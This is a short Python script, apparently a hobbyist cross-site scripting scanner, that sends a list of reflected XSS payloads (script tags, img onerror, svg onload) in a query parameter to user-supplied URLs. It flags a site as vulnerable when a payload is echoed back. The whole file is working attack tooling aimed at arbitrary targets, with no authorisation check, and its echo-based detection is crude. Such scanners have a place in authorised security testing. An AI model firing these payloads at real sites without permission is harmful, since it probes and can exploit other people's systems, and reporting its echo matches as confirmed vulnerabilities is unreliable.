import requests
import time
import threading
import sys

# Define the XSS payloads you want to test
payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "'\"><img src=1 onerror=alert(1)>",
    "'\"><svg onload=alert(1)>",
    "'\"><input type=\"image\" src=x onerror=alert(1)>",
    "';alert('XSS');//"
]

# ASCII banner
ascii_art = r"""
██╗  ██╗███████╗███████╗██╗  ██╗ ██████╗ 
╚██╗██╔╝██╔════╝██╔════╝██║  ██║██╔════╝ 
 ╚███╔╝ ███████╗███████╗███████║██║  ███╗
 ██╔██╗ ╚════██║╚════██║╚════██║██║   ██║
██╔╝ ██╗███████║███████║     ██║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝     ╚═╝ ╚═════╝ 
"""

def loading_animation(message="Scanning in progress..."):
    """Displays a loading animation."""
    animation = "|/-\\"
    idx = 0
    sys.stdout.write(f"{message} ")
    while not stop_loading:
        sys.stdout.write(animation[idx % len(animation)])
        sys.stdout.flush()
        sys.stdout.write("\b")
        idx += 1
        time.sleep(0.1)

def scan_xss(url, output_file=None):
    global stop_loading
    vulnerable = False

    print(f"Scanning URL: {url}")
    if output_file:
        with open(output_file, 'a') as file:
            file.write(f"Scanning URL: {url}\n")

    stop_loading = False
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()

    for payload in payloads:
        # Inject the payload into a query parameter
        injection_url = f"{url}?q={payload}"
        try:
            response = requests.get(injection_url)
            if payload in response.text:
                stop_loading = True
                loading_thread.join()
                result = f"\nVulnerable to XSS: {injection_url}"
                print(result)
                if output_file:
                    with open(output_file, 'a') as file:
                        file.write(result + "\n")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            stop_loading = True
            loading_thread.join()
            error_message = f"\nError: {e}"
            print(error_message)
            if output_file:
                with open(output_file, 'a') as file:
                    file.write(error_message + "\n")
            return

    stop_loading = True
    loading_thread.join()

    if not vulnerable:
        no_vulnerabilities = "No XSS vulnerabilities found."
        print(no_vulnerabilities)
        if output_file:
            with open(output_file, 'a') as file:
                file.write(no_vulnerabilities + "\n")

def scan_from_file(file_path, output_file=None):
    with open(file_path, 'r') as file:
        urls = file.readlines()
        for url in urls:
            url = url.strip()  # Remove any leading/trailing whitespace
            if url:
                scan_xss(url, output_file)

if __name__ == "__main__":
    print(ascii_art)
    choice = input("Enter '1' to scan a single URL or '2' to scan URLs from a file: ")
    output_option = input("Do you want to save the output to a file? (y/n): ").lower()
    output_file = None
    if output_option == 'y':
        output_file = input("Enter the file name for saving the output (e.g., results.txt): ")

    if choice == '1':
        target_url = input("Enter the URL to scan: ")
        scan_xss(target_url, output_file)
    elif choice == '2':
        file_path = input("Enter the path to the .txt file containing URLs: ")
        scan_from_file(file_path, output_file)
    else:
        print("Invalid choice. Please enter '1' or '2'.")
